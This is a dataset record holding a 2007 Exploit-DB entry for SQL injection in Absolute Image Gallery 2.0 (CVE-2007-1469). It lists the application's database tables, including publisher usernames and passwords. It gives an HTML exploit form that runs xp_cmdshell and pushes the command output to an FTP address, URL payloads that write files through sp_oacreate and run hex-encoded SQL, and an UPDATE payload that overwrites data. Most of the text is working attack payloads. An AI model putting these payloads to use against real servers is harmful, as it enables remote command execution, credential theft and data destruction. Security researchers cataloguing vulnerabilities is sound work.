{
  "id": "3493",
  "title": "Absolute Image Gallery 2.0 - &#039;gallery.asp?categoryId&#039; SQL Injection",
  "cve": "CVE-2007-1469",
  "vuln_type": "sqli",
  "code": "Absolute Image Gallery Gallery.ASP (categoryid) MSSQL Injection Exploit\r\n\r\nType :\r\n\r\nSQL Injection\r\n\r\nRelease Date :\r\n\r\n{2007-03-15}\r\n\r\nProduct / Vendor :\r\n\r\nAbsolute Image Gallery\r\n\r\nhttp://www.xigla.com/absoluteig/\r\n\r\nBug :\r\n\r\nhttp://localhost/script/gallery.asp?action=viewimage&categoryid=-SQL Inj-\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nScript Table/Colon Name : \r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : articlefiles\r\n\r\nfileid\r\nfiletitle\r\nfilename\r\narticleid\r\nfiletype\r\nfilecomment\r\nurlfile\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : articles\r\n\r\narticleid\r\nposted\r\nlastupdate\r\nheadline\r\nheadlinedate\r\nstartdate\r\nenddate\r\nsource\r\nsummary\r\narticleurl\r\narticle\r\nstatus\r\nautoformat\r\npublisherid\r\nclicks\r\neditor\r\nrelatedid\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : iArticlesZones\r\n\r\narticleid\r\nzoneid\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : plugins\r\n\r\npluginid\r\npplname\r\npplfile\r\nppldescription\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : PPL1reviews\r\n\r\nreviewid\r\narticleid\r\nname\r\nreviewdate\r\nreview\r\ncomments\r\nisannonymous\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : publishers\r\n\r\npublisherid\r\nname\r\nusername\r\npassword\r\nemail\r\nadditional\r\nplevel\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : publisherszones\r\n\r\npublisherid\r\nzoneid\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : xlaAIGcategories\r\n\r\ncategoryid\r\ncatname\r\ncatdesc\r\nsupercatid\r\nlastupdate\r\ncatpath\r\nimages\r\nallowupload\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : xlaAIGimages\r\n\r\nimageid\r\nimagename\r\nimagedesc\r\nimagefile\r\nimagedate\r\nimagesize\r\ntotalrating\r\ntotalreviews\r\nhits\r\ncategoryid\r\nstatus\r\nuploadedby\r\nadditionalinfo\r\nembedhtml\r\nkeywords\r\ncopyright\r\ncredit\r\nsource\r\ndatecreated\r\nemail\r\ninfourl\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : xlaAIGpostcards\r\n\r\ndateposted\r\npostcardid\r\nimageid\r\nbgcolor\r\nbordercolor\r\nfonttype\r\nfontcolor\r\nrecipientname\r\nrecipientemail\r\ngreeting\r\nbgsound\r\nsendername\r\nsenderemail\r\nsendermsg\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTable Name : zones\r\n\r\nzonename\r\ndescription\r\ntemplate\r\narticlespz\r\nzonefont\r\nfontsize\r\nfontcolor\r\nshowsource\r\nshowsummary\r\nshowdates\r\nshowtn\r\ntextalign\r\ndisplayhoriz\r\ncellcolor\r\ntargetframe\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nMSSQL CMD Injection Exploit(For DBO Users) :\r\n\r\n<title>Absolute Image Gallery MSSQL CMD Injection Exploit</title>\r\n<body bgcolor=\"#000000\">\r\n<form name=\"Form\" method=\"get\" action=\"http://localhost/script/gallery.asp\">\r\n<center><font face=\"Verdana\" size=\"2\" color=\"#FF0000\"><b>Absolute Image Gallery MSSQL CMD Injection Exploit</b></font><br><br></center>\r\n<center><font face=\"Verdana\" size=\"1\" color=\"#00FF00\"><b>Note : For DBO Users</b></font><br><br></center>\r\n<center><font face=\"Verdana\" size=\"1\" color=\"#00FF00\"><b>Example :</b></font><br><br></center>\r\n  <tr>\r\n    <center><img src=\"http://img382.imageshack.us/img382/7867/dirav8.jpg\"></center><br>\r\n    <center><td align=\"right\"><font face=\"Arial\" size=\"1\" color=\"#00FF00\">Command Exec :</td>\r\n    <td> </td>\r\n    <td><input name=\"action=viewimage&categoryid=-1\" type=\"text\" value=\";exec master..xp_cmdshell 'dir c:\\ > cmd.txt';CREATE TABLE cmd (txt varchar(8000));BULK INSERT cmd FROM 'cmd.txt';exec+sp_makewebtask+'ftp://127.0.0.1/public/file.txt','select+*+from+cmd';--\" class=\"inputbox\" style=\"color: #000000\" style=\"width:300px; \"></td>\r\n  </tr>\r\n  <tr>\r\n    <td align=\"right\"><font face=\"Arial\" size=\"1\" color=\"#00FF00\">Search Board</td>\r\n    <td> </td>\r\n    <td>\r\n      <select name=\"\">\r\n        <option value=\"0\">(CMD)</option>\r\n      </select> <br><br>\r\n      <input type=\"submit\" value=\"Apply\"></center>\r\n    </td>\r\n  </tr>\r\n</table>\r\n</form>\r\n<center><font face=\"Verdana\" size=\"2\" color=\"#FF0000\"><b>UniquE-Key{UniquE-Cracker}</b></font>\r\n<br>\r\n<font face=\"Verdana\" size=\"2\" color=\"#FF0000\"><b>UniquE@UniquE-Key.ORG</b></font>\r\n<br>\r\n<font face=\"Verdana\" size=\"2\" color=\"#FF0000\"><b>http://UniquE-Key.ORG</b></font></center>\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nCode Injection(For DBO Users) :\r\n\r\nAdd Table : http://localhost/script/gallery.asp?action=viewimage&categoryid=-1;Create+table+code+(txt+varchar(8000),id+int);--\r\n\r\nASCII Code Add Database : http://localhost/script/gallery.asp?action=viewimage&categoryid=-1;declare+@q+varchar(8000)+select+@q=0x696E7365727420696E746F2066736F373737287478742C6964292076616C7565732827272C3129+exec(@q);--\r\n\r\nCode Injection : http://localhost/script/gallery.asp?action=viewimage&categoryid=-1;declare+@txt+varchar(8000);select+@txt+=+(select+top+1+txt+from+code+where+id+=+1);declare+@o+int,+@f+int,+@t+int,+@ret+int+exec+sp_oacreate+'scripting.filesystemobject',+@o+out+exec+sp_oamethod+@o,+'createtextfile',+@f+out,+'c:/host',+1+exec+@ret+=+sp_oamethod+@f,+'writeline',+NULL,+@txt;--\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nUPDATE(ALL users) :\r\n\r\nhttp://localhost/script/gallery.asp?action=viewimage&categoryid=-1 UPDATE table SET colon = 'x';--\r\n\r\n---------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\nTested :\r\n\r\nAbsolute Image Gallery 2.0\r\n\r\nVulnerable :\r\n\r\nAbsolute Image Gallery 2.0\r\n\r\nAuthor :\r\n\r\nUniquE-Key{UniquE-Cracker}\r\nUniquE(at)UniquE-Key.Org\r\nhttp://www.UniquE-Key.Org\r\n\r\n# milw0rm.com [2007-03-15]",
  "url": "https://www.exploit-db.com/exploits/3493"
}